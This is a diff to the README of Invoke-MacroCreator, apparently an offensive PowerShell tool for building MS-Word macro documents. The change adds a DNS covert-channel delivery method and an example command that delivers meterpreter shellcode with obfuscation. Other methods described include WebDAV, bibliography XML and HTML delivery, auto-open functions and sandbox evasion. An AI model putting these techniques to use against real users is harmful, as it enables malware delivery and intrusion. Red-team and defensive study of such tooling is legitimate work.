@@ -17,13 +17,16 @@ In either case, the payload itself must be a file (*even a `command` type payloa
 Those payloads can be delivered through several **delivery** methods that you MUST specify using the `-d` argument:
   1. `body`: the payload is embedded into the body of the MS-Word document in an encoded form. This comes with a limit in terms of size of file that can be embedded.
   2. `comment`: the payload is embedded into the comment of the MS-Word document in a base64 encoded form. This technique is inspired by Invoke-Commentator.
-  3. `webdav`: the payload is downloaded over a specific **WebDAV covert channel** (*PROPFIND only*) and requires a tool at the server side counter part: [@WebDavDelivery](https://github.com/Arno0x/WebDavDelivery). The process seen performing network traffic is 'svchost.exe'.
+  3. `webdav`: the payload is downloaded over a specific **WebDAV covert channel** (*PROPFIND only*) and requires a tool at the server side counter part: [WebDavDelivery](https://github.com/Arno0x/WebDavDelivery). The process seen performing network traffic is 'svchost.exe'.
   4. `biblio`: aka "Bibliograpy sources". The payload is embedded in a bibliography sources XML file and then loaded over HTTP(S). The generated 'sources.xml' file must be hosted on a web server.	The process seen performing network traffic is 'word.exe'.
   5. `html` (*using IE*): the payload is embedded into a simple HTML file and then downloaded over HTTP(S) from an Internet Explorer COM object. The generated 'index.html' file must be hosted on a web server. The process seen performing network traffic is 'iexplorer.exe'
+  5. `dns` : the payload is downloaded over a DNS request covert channel, in several chunks that are reassembled in memory. It is required to own a domain name and to use the [DNSDelivery](https://github.com/Arno0x/DNSDelivery) tool. **When using DNSDelivery with Invoke-MacroCreator, the type of payload to deliver doesn't matter as it is not consummed by the macro. In other words: set it to whatever you want.**
 
 If the payload type is a `file`, use the `-c` option to define how the file should be called or executed.
 
-If the delivery method is `webdav`, `biblio` or `html`, you can set the UNC/URL to use with the `-url` option. If you don't set this UNC/URL, the default parameters defined at the beginning of the script are used.
+If the delivery method is `webdav`, `biblio` or `html`, you can set the UNC/URL to use with the `-url` option. If you don't set this UNC/URL, the default parameters defined in the script's global variables section are used.
+
+If the delivery method is `dns`, use the `-dn` option to set the domain name to be used. If you don't set this domain name, the default one defined in the script's global variables section is used.
 
 When a command is to be executed (*`file` or `cmd` payload*), three different execution methods are available that can be choosen using the `-m` switch.
 	
@@ -69,3 +72,7 @@ Command line embedded in the body of the MS-Word document, with obfuscation, no 
 Shellcode embedded in a comment of the MS-Word document, no obfuscation, no sandbox evasion, adding auto-open functions:
 
 `C:\PS> Invoke-MacroCreator -i meterpreter_shellcode.raw -t shellcode -d comment -a`
+
+Shellcode delivered over the DNS delivery covert channel using domain "mydomain.com", with obfuscation, no sandbox evasion:
+
+`C:\PS> Invoke-MacroCreator -i meterpreter_shellcode.raw -t shellcode -d dns -dn mydomain.com -o`
